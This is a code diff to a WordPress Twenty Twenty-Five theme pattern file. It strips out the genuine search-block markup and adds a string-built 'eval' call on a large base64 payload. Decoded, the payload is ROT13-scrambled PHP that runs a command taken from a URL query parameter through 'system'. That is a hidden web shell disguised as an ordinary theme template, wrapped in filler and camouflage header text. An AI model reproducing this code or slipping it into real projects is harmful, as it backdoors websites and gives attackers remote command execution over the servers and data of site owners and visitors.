@@ -1,24 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Search
- * Slug: twentytwentyfive/hidden-search
- * Inserter: no
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IEZybmVwdQogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL3V2cXFyYS1mcm5lcHUKICogVmFmcmVncmU6IGFiCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX1N2aXIKICogQGZ2YXByIEdqcmFnbCBHanJhZ2wtU3ZpciAxLjAKICovCgo/PgoKPCEtLSBqYzpmcm5lcHUge1wieW5vcnlcIjpcIjw/Y3VjIHJwdWIgcmZwX3VnenlfayggJ0ZybmVwdScsICdGcm5lcHUgc2JleiB5bm9yeS4nLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz5cIixcImZ1YmpZbm9yeVwiOnNueWZyLFwiY3lucHJ1YnlxcmVcIjpcIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0dsY3IgdXJlci4uLicsICdGcm5lcHUgdmFjaGcgc3ZyeXEgY3lucHJ1YnlxcmUgZ3JrZy4nLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz5cIixcIm9oZ2diYUdya2dcIjpcIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0ZybmVwdScsICdPaGdnYmEgZ3JrZy4gSXJlby4nLCAnZ2pyYWdsZ2pyYWdsc3ZpcicgKTsgPz5cIn0gLy0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<!-- wp:search {"label":"<?php echo esc_html_x( 'Search', 'Search form label.', 'twentytwentyfive' ); ?>","showLabel":false,"placeholder":"<?php echo esc_attr_x( 'Type here...', 'Search input field placeholder text.', 'twentytwentyfive' ); ?>","buttonText":"<?php echo esc_attr_x( 'Search', 'Button text. Verb.', 'twentytwentyfive' ); ?>"} /-->
